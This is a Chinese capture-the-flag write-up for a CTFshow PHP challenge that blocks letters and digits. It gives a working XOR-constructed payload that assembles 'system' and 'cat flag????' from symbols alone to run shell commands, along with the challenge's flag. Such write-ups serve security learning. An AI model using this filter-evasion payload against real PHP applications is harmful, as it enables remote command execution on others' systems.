## 10月17日：[\[CTFshow\] 无字母数字代码执行](https://ctf.show/challenges#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-4570)
### 考点：PHP 代码执行、字符过滤、字符串异或

本题的过滤等价于：
```php
if (preg_match('/[A-Za-z0-9]/', $code)) die('Invalid shell code!');
```

**原理**：PHP 的 `^` 对字符串逐字节异或。只要目标字符能拆成两个"非字母数字字符"的异或结果，
就能用纯符号拼出任意函数名和命令。变量名也只能用下划线（`$_`、`$__`），因为变量名里同样不能有字母。

```php
$_='_____-'^',&,+:@';                // => system
$__='___[;,_;____'^'<>+{]@>\\````';   // => cat flag????
$_($__);                              // 动态函数调用
```

**卡点**：字母、空格、`?` 都能异或构造，但 `.` `/` `-` `*` 和所有数字构造不出来，
所以 `flag.php` 里那个点号写不出来。
绕过办法是 shell 通配符：`flag????`（`.php` 正好 4 个字符），不碰点号也能选中文件。

**观察**：页面在命令没有输出时会回显代码 + `execute success!`，别被它骗了以为执行成功；
先看有没有真正的输出。

**flag**：`CTF{no_characters_to_execute_php_code}`
